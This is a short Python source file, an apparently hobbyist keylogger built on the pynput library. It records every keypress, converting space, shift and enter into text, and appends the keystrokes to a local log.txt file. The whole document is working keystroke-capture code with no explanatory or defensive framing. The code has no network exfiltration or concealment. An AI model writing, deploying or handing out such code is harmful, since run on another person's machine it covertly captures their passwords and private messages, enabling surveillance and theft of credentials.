from pynput.keyboard import Key, Listener

class MyKeylogger:
    def on_press(self,keys):
        try:
            current_key=str(keys.char)
        except:
            if keys==Key.space:
                current_key=" "
            elif keys==Key.shift:
                current_key=""
            elif keys==Key.enter:
                current_key="\n"
            else:
                current_key=" "+str(keys)+" "
        self.write_files(current_key)


    def write_files(self,keys):
        k=str(keys).replace("'","")
        
        with open ("log.txt",'a')as f:
            f.write(k)

    def main (self):
        with Listener(on_press= self.on_press)as l:
            l.join()   

if __name__ == "__main__":
    keylogger = MyKeylogger()
    keylogger.main() 
